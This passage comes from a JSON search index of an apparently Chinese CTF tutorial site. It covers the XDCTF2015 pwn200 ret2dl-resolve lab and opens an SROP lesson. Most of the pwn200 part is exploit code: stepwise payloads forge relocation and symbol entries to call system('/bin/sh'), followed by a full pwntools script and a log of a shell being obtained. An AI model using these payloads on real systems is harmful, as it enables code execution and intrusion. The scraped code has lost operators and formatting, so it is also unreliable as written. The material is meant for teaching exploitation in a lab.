     st_value ;         /* Symbol value */ \n   Elf32_Word      st_size ;          /* Symbol size */ \n   unsigned   char   st_info ;          /* Symbol type and binding */ \n   unsigned   char   st_other ;         /* Symbol visibility */ \n   Elf32_Section   st_shndx ;         /* Section index */  }   Elf32_Sym ;   $ readelf -s a.out | grep write\n     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2) \n\u8f6c\u50a8  .dynsym  \u6bb5\u5e76\u627e\u5230\u7b2c 7 \u884c\uff1a $ objdump -s -j .dynsym a.out\n...\n 804823c 4c000000 00000000 00000000 12000000  L...............\n... \n\u5176\u4e2d\u6700\u91cd\u8981\u7684\u662f  st_name  \u548c  st_info \uff0c\u5206\u522b\u4e3a  0x4c  \u548c  0x12 \u3002\u6784\u9020 payload \u5982\u4e0b\uff1a reloc_index   =   base_addr   +   28   -   rel_plt  fake_sym_addr   =   base_addr   +   36  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf )   # since the size of Elf32_Sym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  r_sym   =   ( fake_sym_addr   -   dynsym )   /   0x10    # calcute the symbol index since the size of Elf32_Sym  r_type   =   0x7      # R_386_JMP_SLOT -  Create PLT entry  r_info   =   ( r_sym     8 )   +   ( r_type     0xff )   # ELF32_R_INFO(sym, type) = (((sym)   8) + ((type)   0xff))  fake_reloc   =   p32 ( write_got )   +   p32 ( r_info )  st_name   =   0x4c  st_info   =   0x12  fake_sym   =   p32 ( st_name )   +   p32 ( 0 )   +   p32 ( 0 )   +   p32 ( st_info )  payload_5    =   AAAA  payload_5   +=   p32 ( plt_0 )  payload_5   +=   p32 ( reloc_index )  payload_5   +=   AAAA  payload_5   +=   p32 ( 1 )  payload_5   +=   p32 ( base_addr   +   80 )  payload_5   +=   p32 ( len ( /bin/sh ))  payload_5   +=   fake_reloc  payload_5   +=   A   *   align  payload_5   +=   fake_sym  payload_5   +=   A   *   ( 80   -   len ( payload_5 ))  payload_5   +=   /bin/sh \\x00  payload_5   +=   A   *   ( 100   -   len ( payload_5 ))  io . sendline ( payload_5 )  print   io . recv ()  \n\u4e00\u6837\u5730\u8bb2\u4e00\u4e0b st_info \u7684\u89e3\u6790\u548c\u63d2\u5165\u7b97\u6cd5\uff1a #define ELF32_ST_BIND(val)      (((unsigned char) (val))   4)  #define ELF32_ST_TYPE(val)      ((val)   0xf)  #define ELF32_ST_INFO(bind, type)   (((bind)   4) + ((type)   0xf))  \n-  ELF32_ST_BIND(0x12) = (((unsigned char) (0x12))   4) = 0x1 \uff0c\u5373  #define STB_GLOBAL 1 /* Global symbol */ \n-  ELF32_ST_TYPE(0x12) = ((0x12)   0xf) = 0x2 \uff0c\u5373  #define STT_FUNC 2 /* Symbol is a code object */ \n-  ELF32_ST_INFO(0x1, 0x2) = (((0x1)   4) + ((0x2)   0xf)) = 0x12 \uff0c\u5373 st_info  \u4e0b\u4e00\u6b65\uff0c\u662f\u5c06  st_name  \u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684\u5b57\u7b26\u4e32 \"write\"\uff0cpayload \u5982\u4e0b\uff1a reloc_index   =   base_addr   +   28   -   rel_plt  fake_sym_addr   =   base_addr   +   36  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf )  fake_sym_addr   =   fake_sym_addr   +   align  r_sym   =   ( fake_sym_addr   -   dynsym )   /   0x10  r_type   =   0x7  r_info   =   ( r_sym     8 )   +   ( r_type     0xff )  fake_reloc   =   p32 ( write_got )   +   p32 ( r_info )  st_name   =   fake_sym_addr   +   0x10   -   dynstr       # address of string  write  st_bind   =   0x1     # STB_GLOBAL -  Global symbol  st_type   =   0x2     # STT_FUNC -  Symbol is a code object  st_info   =   ( st_bind     4 )   +   ( st_type     0xf )    # 0x12  fake_sym   =   p32 ( st_name )   +   p32 ( 0 )   +   p32 ( 0 )   +   p32 ( st_info )  payload_6   =   AAAA  payload_6   +=   p32 ( plt_0 )  payload_6   +=   p32 ( reloc_index )  payload_6   +=   AAAA  payload_6   +=   p32 ( 1 )  payload_6   +=   p32 ( base_addr   +   80 )  payload_6   +=   p32 ( len ( /bin/sh ))  payload_6   +=   fake_reloc  payload_6   +=   A   *   align  payload_6   +=   fake_sym  payload_6   +=   write \\x00  payload_6   +=   A   *   ( 80   -   len ( payload_6 ))  payload_6   +=   /bin/sh \\x00  payload_6   +=   A   *   ( 100   -   len ( payload_6 ))  io . sendline ( payload_6 )  print   io . recv ()   \u6700\u540e\uff0c\u53ea\u8981\u5c06 \"write\" \u66ff\u6362\u6210\u4efb\u4f55\u6211\u4eec\u5e0c\u671b\u7684\u51fd\u6570\uff0c\u5e76\u8c03\u6574\u53c2\u6570\uff0c\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u6362\u6210 \"system\"\uff0c\u62ff\u5230 shell\uff1a reloc_index   =   base_addr   +   28   -   rel_plt  fake_sym_addr   =   base_addr   +   36  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf )  fake_sym_addr   =   fake_sym_addr   +   align  r_sym   =   ( fake_sym_addr   -   dynsym )   /   0x10  r_type   =   0x7  r_info   =   ( r_sym     8 )   +   ( r_type     0xff )  fake_reloc   =   p32 ( write_got )   +   p32 ( r_info )  st_name   =   fake_sym_addr   +   0x10   -   dynstr  st_bind   =   0x1  st_type   =   0x2  st_info   =   ( st_bind     4 )   +   ( st_type     0xf )  fake_sym   =   p32 ( st_name )   +   p32 ( 0 )   +   p32 ( 0 )   +   p32 ( st_info )  payload_7   =   AAAA  payload_7   +=   p32 ( plt_0 )  payload_7   +=   p32 ( reloc_index )  payload_7   +=   AAAA  payload_7   +=   p32 ( base_addr   +   80 )  payload_7   +=   AAAA  payload_7   +=   AAAA  payload_7   +=   fake_reloc  payload_7   +=   A   *   align  payload_7   +=   fake_sym  payload_7   +=   system \\x00  payload_7   +=   A   *   ( 80   -   len ( payload_7 ))  payload_7   +=   /bin/sh \\x00  payload_7   +=   A   *   ( 100   -   len ( payload_7 ))  io . sendline ( payload_7 )  io . interactive ()   Bingo!!! $ python2 exp.py\n[*]  /home/firmy/Desktop/a.out \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] Switching to interactive mode\n$ whoami\nfirmy  \u8fd9\u9898\u662f 32 \u4f4d\u7a0b\u5e8f\uff0c\u5728 64 \u4f4d\u4e0b\u4f1a\u6709\u4e00\u4e9b\u53d8\u5316\uff0c\u6bd4\u5982\u8bf4\uff1a\n- 64 \u4f4d\u7a0b\u5e8f\u4e00\u822c\u60c5\u51b5\u4e0b\u4f7f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u4f46\u7ed9  _dl_runtime_resolve  \u4f20\u53c2\u65f6\u4f7f\u7528\u6808\n-  _dl_runtime_resolve  \u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570  reloc_index  \u7531\u504f\u79fb\u53d8\u4e3a\u4e86\u7d22\u5f15\u3002\n-  _dl_fixup  \u51fd\u6570\u4e2d\uff0c\u5728\u4f2a\u9020 fake_sym \u540e\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5d29\u6e83\uff0c\u9700\u8981\u5c06  link_map+0x1c8  \u5730\u5740\u4e0a\u7684\u503c\u7f6e\u96f6  \u5177\u4f53\u7684\u4ee5\u540e\u9047\u5230\u518d\u8bf4\u3002  \u5982\u679c\u89c9\u5f97\u624b\u5de5\u6784\u9020\u592a\u9ebb\u70e6\uff0c\u6709\u4e00\u4e2a\u5de5\u5177  roputils  \u53ef\u4ee5\u7b80\u5316\u6b64\u8fc7\u7a0b\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u81ea\u884c\u5c1d\u8bd5\u3002", 
            "title": "pwn200"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  # context.log_level =  debug  elf   =   ELF ( ./a.out )  io   =   remote ( 127.0.0.1 ,   10001 )  io . recv ()  pppr_addr        =   0x08048699       # pop esi ; pop edi ; pop ebp ; ret  pop_ebp_addr     =   0x0804869b       # pop ebp ; ret  leave_ret_addr   =   0x080484b6       # leave ; ret  write_plt   =   elf . plt [ write ]  write_got   =   elf . got [ write ]  read_plt    =   elf . plt [ read ]  plt_0      =   elf . get_section_by_name ( .plt ) . header . sh_addr          # 0x80483e0  rel_plt    =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr      # 0x8048390  dynsym     =   elf . get_section_by_name ( .dynsym ) . header . sh_addr       # 0x80481cc  dynstr     =   elf . get_section_by_name ( .dynstr ) . header . sh_addr       # 0x804828c  bss_addr   =   elf . get_section_by_name ( .bss ) . header . sh_addr          # 0x804a028  base_addr   =   bss_addr   +   0x600      # 0x804a628  payload_1    =   A   *   112  payload_1   +=   p32 ( read_plt )  payload_1   +=   p32 ( pppr_addr )  payload_1   +=   p32 ( 0 )  payload_1   +=   p32 ( base_addr )  payload_1   +=   p32 ( 100 )  payload_1   +=   p32 ( pop_ebp_addr )  payload_1   +=   p32 ( base_addr )  payload_1   +=   p32 ( leave_ret_addr )  io . send ( payload_1 )  # payload_2  =  AAAA      # new ebp  # payload_2 += p32(write_plt)  # payload_2 +=  AAAA  # payload_2 += p32(1)  # payload_2 += p32(base_addr + 80)  # payload_2 += p32(len( /bin/sh ))  # payload_2 +=  A  * (80 - len(payload_2))  # payload_2 +=  /bin/sh\\x00  # payload_2 +=  A  * (100 - len(payload_2))  # io.sendline(payload_2)  # print io.recv()  # reloc_index = 0x20  # payload_3  =  AAAA  # payload_3 += p32(plt_0)  # payload_3 += p32(reloc_index)  # payload_3 +=  AAAA  # payload_3 += p32(1)  # payload_3 += p32(base_addr + 80)  # payload_3 += p32(len( /bin/sh ))  # payload_3 +=  A  * (80 - len(payload_3))  # payload_3 +=  /bin/sh\\x00  # payload_3 +=  A  * (100 - len(payload_3))  # io.sendline(payload_3)  # print io.recv()  # reloc_index = base_addr + 28 - rel_plt  # fake_reloc = base_addr + 28  # r_info = 0x707  # fake_reloc = p32(write_got) + p32(r_info)  # payload_4  =  AAAA  # payload_4 += p32(plt_0)  # payload_4 += p32(reloc_index)  # payload_4 +=  AAAA  # payload_4 += p32(1)  # payload_4 += p32(base_addr + 80)  # payload_4 += p32(len( /bin/sh ))  # payload_4 += fake_reloc  # payload_4 +=  A  * (80 - len(payload_4))  # payload_4 +=  /bin/sh\\x00  # payload_4 +=  A  * (100 - len(payload_4))  # io.sendline(payload_4)  # print io.recv()  # reloc_index = base_addr + 28 - rel_plt  # fake_sym_addr = base_addr + 36  # align = 0x10 - ((fake_sym_addr - dynsym)   0xf) # since the size of Elf32_Sym is 0x10  # fake_sym_addr = fake_sym_addr + align  # r_sym = (fake_sym_addr - dynsym) / 0x10  # calcute the symbol index since the size of Elf32_Sym  # r_type = 0x7    # R_386_JMP_SLOT -  Create PLT entry  # r_info = (r_sym   8) + (r_type   0xff) # ELF32_R_INFO(sym, type) = (((sym)   8) + ((type)   0xff))  # fake_reloc = p32(write_got) + p32(r_info)  # st_name = 0x4c  # st_info = 0x12  # fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)  # payload_5  =  AAAA  # payload_5 += p32(plt_0)  # payload_5 += p32(reloc_index)  # payload_5 +=  AAAA  # payload_5 += p32(1)  # payload_5 += p32(base_addr + 80)  # payload_5 += p32(len( /bin/sh ))  # payload_5 += fake_reloc  # payload_5 +=  A  * align  # payload_5 += fake_sym  # payload_5 +=  A  * (80 - len(payload_5))  # payload_5 +=  /bin/sh\\x00  # payload_5 +=  A  * (100 - len(payload_5))  # io.sendline(payload_5)  # print io.recv()  # reloc_index = base_addr + 28 - rel_plt  # fake_sym_addr = base_addr + 36  # align = 0x10 - ((fake_sym_addr - dynsym)   0xf)  # fake_sym_addr = fake_sym_addr + align  # r_sym = (fake_sym_addr - dynsym) / 0x10  # r_type = 0x7  # r_info = (r_sym   8) + (r_type   0xff)  # fake_reloc = p32(write_got) + p32(r_info)  # st_name = fake_sym_addr + 0x10 - dynstr     # address of string  write  # st_bind = 0x1   # STB_GLOBAL -  Global symbol  # st_type = 0x2   # STT_FUNC -  Symbol is a code object  # st_info = (st_bind   4) + (st_type   0xf)  # 0x12  # fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)  # payload_6 =  AAAA  # payload_6 += p32(plt_0)  # payload_6 += p32(reloc_index)  # payload_6 +=  AAAA  # payload_6 += p32(1)  # payload_6 += p32(base_addr + 80)  # payload_6 += p32(len( /bin/sh ))  # payload_6 += fake_reloc  # payload_6 +=  A  * align  # payload_6 += fake_sym  # payload_6 +=  write\\x00  # payload_6 +=  A  * (80 - len(payload_6))  # payload_6 +=  /bin/sh\\x00  # payload_6 +=  A  * (100 - len(payload_6))  # io.sendline(payload_6)  # print io.recv()  # reloc_index = base_addr + 28 - rel_plt  # fake_sym_addr = base_addr + 36  # align = 0x10 - ((fake_sym_addr - dynsym)   0xf)  # fake_sym_addr = fake_sym_addr + align  # r_sym = (fake_sym_addr - dynsym) / 0x10  # r_info = (r_sym   8) + 0x7  # fake_reloc = p32(write_got) + p32(r_info)  # st_name = fake_sym_addr + 0x10 - dynstr  # fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)  # payload_7  =  AAAA  # payload_7 += p32(plt_0)  # payload_7 += p32(reloc_index)  # payload_7 +=  AAAA  # payload_7 += p32(base_addr + 80)  # payload_7 +=  AAAA  # payload_7 +=  AAAA  # payload_7 += fake_reloc  # payload_7 +=  A  * align  # payload_7 += fake_sym  # payload_7 +=  system\\x00  # payload_7 +=  A  * (80 - len(payload_7))  # payload_7 +=  /bin/sh\\x00  # payload_7 +=  A  * (100 - len(payload_7))  # io.sendline(payload_7)  reloc_index   =   base_addr   +   28   -   rel_plt  fake_sym_addr   =   base_addr   +   36  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf )  fake_sym_addr   =   fake_sym_addr   +   align  r_sym   =   ( fake_sym_addr   -   dynsym )   /   0x10  r_type   =   0x7  r_info   =   ( r_sym     8 )   +   ( r_type     0xff )  fake_reloc   =   p32 ( write_got )   +   p32 ( r_info )  st_name   =   fake_sym_addr   +   0x10   -   dynstr  st_bind   =   0x1  st_type   =   0x2  st_info   =   ( st_bind     4 )   +   ( st_type     0xf )  fake_sym   =   p32 ( st_name )   +   p32 ( 0 )   +   p32 ( 0 )   +   p32 ( st_info )  payload_7   =   AAAA  payload_7   +=   p32 ( plt_0 )  payload_7   +=   p32 ( reloc_index )  payload_7   +=   AAAA  payload_7   +=   p32 ( base_addr   +   80 )  payload_7   +=   AAAA  payload_7   +=   AAAA  payload_7   +=   fake_reloc  payload_7   +=   A   *   align  payload_7   +=   fake_sym  payload_7   +=   system \\x00  payload_7   +=   A   *   ( 80   -   len ( payload_7 ))  payload_7   +=   /bin/sh \\x00  payload_7   +=   A   *   ( 100   -   len ( payload_7 ))  io . sendline ( payload_7 )  io . interactive ()", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#_4", 
            "text": "How the ELF Ruined Christmas  Return-to-dl-resolve", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.4_pwn_backdoorctf2017_fun_signals/", 
            "text": "SROP \u539f\u7406\n\n\nLinux \u7cfb\u7edf\u8c03\u7528\n\n\nsignal \u673a\u5236\n\n\nSROP\n\n\npwnlib.rop.srop\n\n\nBackdoorCTF2017 Fun Signals\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\nSROP \u539f\u7406\n\n\nLinux \u7cfb\u7edf\u8c03\u7528\n\n\n\u5728\u5f00\u59cb\u8fd9\u4e00\u5207\u4e4b\u524d\uff0c\u6211\u60f3\u5148\u8bb2\u4e00\u4e0b Linux \u7684\u7cfb\u7edf\u8c03\u7528\u300264 \u4f4d\u548c 32 \u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u8868\u5206\u522b\u5728\n\n/usr/include/asm/unistd_64.h\n \u548c \n/usr/include/asm/unistd_32.h\n \u4e2d\uff0c\u53e6\u5916\u8fd8\u9700\u8981\u67e5\u770b \n/usr/include/bits/syscall.h\n\u3002\n\n\n\u4e00\u5f00\u59cb Linux \u662f\u901a\u8fc7 \nint 0x80\n \u4e2d\u65ad\u7684\u65b9\u5f0f\u8fdb\u5165\u7cfb\u7edf\u8c03\u7528\uff0c\u5b83\u4f1a\u5148\u8fdb\u884c\u8c03\u7528\u8005\u7279\u6743\u7ea7\u522b\u7684\u68c0\u67e5\uff0c\u7136\u540e\u8fdb\u884c\u538b\u6808\u3001\u8df3\u8f6c\u7b49\u64cd\u4f5c\uff0c\u8fd9\u65e0\u7591\u4f1a\u6d6a\u8d39\u8bb8\u591a\u8d44\u6e90\u3002\u4ece Linux 2.6 \u5f00\u59cb\uff0c\u5c31\u51fa\u73b0\u4e86\u65b0\u7684\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4 \nsysenter\n/\nsysexit\n\uff0c\u524d\u8005\u7528\u4e8e\u4ece Ring3 \u8fdb\u5165 Ring0\uff0c\u540e\u8005\u7528\u4e8e\u4ece Ring0 \u8fd4\u56de Ring3\uff0c\u5b83\u6ca1\u6709\u7279\u6743\u7ea7\u522b\u68c0\u67e5\uff0c\u4e5f\u6ca1\u6709\u538b\u6808\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u6267\u884c\u901f\u5ea6\u66f4\u5feb\u3002\n\n\nsignal \u673a\u5236\n\n\n\n\n\u5982\u56fe\u6240\u793a\uff0c\u5f53\u6709\u4e2d\u65ad\u6216\u5f02\u5e38\u4ea7\u751f\u65f6\uff0c\u5185\u6838\u4f1a\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001\u4e00\u4e2a signal\uff0c\u8be5\u8fdb\u7a0b\u88ab\u6302\u8d77\u5e76\u8fdb\u5165\u5185\u6838\uff081\uff09\uff0c\u7136\u540e\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u4e4b\u524d\u6ce8\u518c\u597d\u7684 signal handler \u4e2d\u5904\u7406\u76f8\u5e94\u7684 signal\uff082\uff09\uff0c\u5f53 signal handler \u8fd4\u56de\u540e\uff083\uff09\uff0c\u5185\u6838\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u6700\u7ec8\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\uff084\uff09\u3002\n\n\n\n\n\u4e00\u4e2a signal frame \u88ab\u6dfb\u52a0\u5230\u6808\uff0c\u8fd9\u4e2a frame \u4e2d\u5305\u542b\u4e86\u5f53\u524d\u5bc4\u5b58\u5668\u7684\u503c\u548c\u4e00\u4e9b signal \u4fe1\u606f\u3002\n\n\n\u4e00\u4e2a\u65b0\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6dfb\u52a0\u5230\u6808\u9876\uff0c\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u6307\u5411 \nsigreturn\n \u7cfb\u7edf\u8c03\u7528\u3002\n\n\nsignal handler \u88ab\u8c03\u7528\uff0csignal handler \u7684\u884c\u4e3a\u53d6\u51b3\u4e8e\u6536\u5230\u4ec0\u4e48 signal\u3002\n\n\nsignal handler \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u7ec8\u6b62\uff0c\u5219\u8fd4\u56de\u5730\u5740\u7528\u4e8e\u6267\u884c \nsigreturn\n \u7cfb\u7edf\u8c03\u7528\u3002\n\n\nsigreturn\n \u5229\u7528 signal frame \u6062\u590d\u6240\u6709\u5bc4\u5b58\u5668\u4ee5\u56de\u5230\u4e4b\u524d\u7684\u72b6\u6001\u3002\n\n\n\u6700\u540e\uff0c\u7a0b\u5e8f\u6267\u884c\u7ee7\u7eed\u3002\n\n\n\n\n\u4e0d\u540c\u7684\u67b6\u6784\u4f1a\u6709\u4e0d\u540c\u7684 signal frame\uff0c\u4e0b\u9762\u662f 32 \u4f4d\u7ed3\u6784\uff0c\nsigcontext\n \u7ed3\u6784\u4f53\u4f1a\u88ab push \u5230\u6808\u4e2d\uff1a\n\nstruct\n \nsigcontext\n\n\n{\n\n  \nunsigned\n \nshort\n \ngs\n,\n \n__gsh\n;\n\n  \nunsigned\n \nshort\n \nfs\n,\n \n__fsh\n;\n\n  \nunsigned\n \nshort\n \nes\n,\n \n__esh\n;\n\n  \nunsigned\n \nshort\n \nds\n,\n \n__dsh\n;\n\n  \nunsigned\n \nlong\n \nedi\n;\n\n  \nunsigned\n \nlong\n \nesi\n;\n\n  \nunsigned\n \nlong\n \nebp\n;\n\n  \nunsigned\n \nlong\n \nesp\n;\n\n  \nunsigned\n \nlong\n \nebx\n;\n\n  \nunsigned\n \nlong\n \nedx\n;\n\n  \nunsigned\n \nlong\n \necx\n;\n\n  \nunsigned\n \nlong\n \neax\n;\n\n  \nunsigned\n \nlong\n \ntrapno\n;\n\n  \nunsigned\n \nlong\n \nerr\n;\n\n  \nunsigned\n \nlong\n \neip\n;\n\n  \nunsigned\n \nshort\n \ncs\n,\n \n__csh\n;\n\n  \nunsigned\n \nlong\n \neflags\n;\n\n  \nunsigned\n \nlong\n \nesp_at_signal\n;\n\n  \nunsigned\n \nshort\n \nss\n,\n \n__ssh\n;\n\n  \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n  \nunsigned\n \nlong\n \noldmask\n;\n\n  \nunsigned\n \nlong\n \ncr2\n;\n\n\n};\n\n\n\n\u4e0b\u9762\u662f 64 \u4f4d\uff0cpush \u5230\u6808\u4e2d\u7684\u5176\u5b9e\u662f \nucontext_t\n \u7ed3\u6784\u4f53\uff1a\n\n// defined in /usr/include/sys/ucontext.h\n\n\n/* Userlevel context.  */\n\n\ntypedef\n \nstruct\n \nucontext_t\n\n  \n{\n\n    \nunsigned\n \nlong\n \nint\n \nuc_flags\n;\n\n    \nstruct\n \nucontext_t\n \n*\nuc_link\n;\n\n    \nstack_t\n \nuc_stack\n;\n           \n// the stack used by this context\n\n    \nmcontext_t\n \nuc_mcontext\n;\n     \n// the saved context\n\n    \nsigset_t\n \nuc_sigmask\n;\n\n    \nstruct\n \n_libc_fpstate\n \n__fpregs_mem\n;\n\n  \n}\n \nucontext_t\n;\n\n\n\n// defined in /usr/include/bits/types/stack_t.h\n\n\n/* Structure describing a signal stack.  */\n\n\ntypedef\n \nstruct\n\n  \n{\n\n    \nvoid\n \n*\nss_sp\n;\n\n    \nsize_t\n \nss_size\n;\n\n    \nint\n \nss_flags\n;\n\n  \n}\n \nstack_t\n;\n\n\n\n// difined in /usr/include/bits/sigcontext.h\n\n\nstruct\n \nsigcontext\n\n\n{\n\n  \n__uint64_t\n \nr8\n;\n\n  \n__uint64_t\n \nr9\n;\n\n  \n__uint64_t\n \nr10\n;\n\n  \n__uint64_t\n \nr11\n;\n\n  \n__uint64_t\n \nr12\n;\n\n  \n__uint64_t\n \nr13\n;\n\n  \n__uint64_t\n \nr14\n;\n\n  \n__uint64_t\n \nr15\n;\n\n  \n__uint64_t\n \nrdi\n;\n\n  \n__uint64_t\n \nrsi\n;\n\n  \n__uint64_t\n \nrbp\n;\n\n  \n__uint64_t\n \nrbx\n;\n\n  \n__uint64_t\n \nrdx\n;\n\n  \n__uint64_t\n \nrax\n;\n\n  \n__uint64_t\n \nrcx\n;\n\n  \n__uint64_t\n \nrsp\n;\n\n  \n__uint64_t\n \nrip\n;\n\n  \n__uint64_t\n \neflags\n;\n\n  \nunsigned\n \nshort\n \ncs\n;\n\n  \nunsigned\n \nshort\n \ngs\n;\n\n  \nunsigned\n \nshort\n \nfs\n;\n\n  \nunsigned\n \nshort\n \n__pad0\n;\n\n  \n__uint64_t\n \nerr\n;\n\n  \n__uint64_t\n \ntrapno\n;\n\n  \n__uint64_t\n \noldmask\n;\n\n  \n__uint64_t\n \ncr2\n;\n\n  \n__extension__\n \nunion\n\n    \n{\n\n      \nstruct\n \n_fpstate\n \n*\n \nfpstate\n;\n\n      \n__uint64_t\n \n__fpstate_word\n;\n\n    \n};\n\n  \n__uint64_t\n \n__reserved1\n \n[\n8\n];\n\n\n};\n\n\n\n\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a\n\n\n\n\nSROP\n\n\nSROP\uff0c\u5373 Sigreturn Oriented Programming\uff0c\u6b63\u662f\u5229\u7528\u4e86 Sigreturn \u673a\u5236\u7684\u5f31\u70b9\uff0c\u6765\u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u9996\u5148\u7cfb\u7edf\u5728\u6267\u884c \nsigreturn\n \u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u5bf9 signal \u505a\u68c0\u67e5\uff0c\u5b83\u4e0d\u77e5\u9053\u5f53\u524d\u7684\u8fd9\u4e2a frame \u662f\u4e0d\u662f\u4e4b\u524d\u4fdd\u5b58\u7684\u90a3\u4e2a frame\u3002\u7531\u4e8e \nsigreturn\n \u4f1a\u4ece\u7528\u6237\u6808\u4e0a\u6062\u590d\u6062\u590d\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c\u7528\u6237\u6808\u662f\u4fdd\u5b58\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\uff0c\u662f\u7528\u6237\u8fdb\u7a0b\u53ef\u8bfb\u5199\u7684\u3002\u5982\u679c\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u4e86\u6808\uff0c\u4e5f\u5c31\u63a7\u5236\u4e86\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c\u8fd9\u4e00\u5207\u53ea\u9700\u8981\u4e00\u4e2a gadget\uff1a\nsyscall; ret;\n\u3002\n\n\n\u53e6\u5916\uff0c\u8fd9\u4e2a gadget \u5728\u4e00\u4e9b\u7cfb\u7edf\u4e0a\u6ca1\u6709\u88ab\u5185\u5b58\u968f\u673a\u5316\u5904\u7406\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u4f4d\u7f6e\u4e0a\u627e\u5230\uff0c\u53c2\u7167\u4e0b\u56fe\uff1a\n\n\n\n\n\u901a\u8fc7\u8bbe\u7f6e \neax/rax\n \u5bc4\u5b58\u5668\uff0c\u53ef\u4ee5\u5229\u7528 \nsyscall\n \u6307\u4ee4\u6267\u884c\u4efb\u610f\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06 \nsigreturn\n \u548c \u5176\u4ed6\u7684\u7cfb\u7edf\u8c03\u7528\u4e32\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u94fe\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u76ee\u7684\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f2a\u9020 frame \u7684\u4f8b\u5b50\uff1a\n\n\n\n\nrax=59\n \u662f \nexecve\n \u7684\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53c2\u6570 \nrdi\n \u8bbe\u7f6e\u4e3a\u5b57\u7b26\u4e32\u201c/bin/sh\u201d\u7684\u5730\u5740\uff0c\nrip\n \u6307\u5411\u7cfb\u7edf\u8c03\u7528 \nsyscall\n\uff0c\u6700\u540e\uff0c\u5c06 \nrt_sigreturn\n \u8bbe\u7f6e\u4e3a \nsigreturn\n \u7cfb\u7edf\u8c03\u7528\u7684\u5730\u5740\u3002\u5f53 \nsigreturn\n \u8fd4\u56de\u540e\uff0c\u5c31\u4f1a\u4ece\u8fd9\u4e2a\u4f2a\u9020\u7684 frame \u4e2d\u6062\u590d\u5bc4\u5b58\u5668\uff0c\u4ece\u800c\u62ff\u5230 shell\u3002\n\n\n\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\uff1a\n\n\n\n\n\n\n\u9996\u5148\u5229\u7528\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5c06\u8fd4\u56de\u5730\u5740\u8986\u76d6\u4e3a\u4e00\u4e2a\u6307\u5411 \nsigreturn\n gadget \u7684\u6307\u9488\u3002\u5982\u679c\u53ea\u6709 \nsyscall\n\uff0c\u5219\u5c06 RAX \u8bbe\u7f6e\u4e3a 0xf\uff0c\u4e5f\u662f\u4e00\u6837\u7684\u3002\u5728\u6808\u4e0a\u8986\u76d6\u4e0a fake frame\u3002\u5176\u4e2d\uff1a\n\n\nRSP\n\uff1a\u4e00\u4e2a\u53ef\u5199\u7684\u5185\u5b58\u5730\u5740\n\n\nRIP\n\uff1a\nsyscall; ret;\n gadget \u7684\u5730\u5740\n\n\nRAX\n\uff1a\nread\n 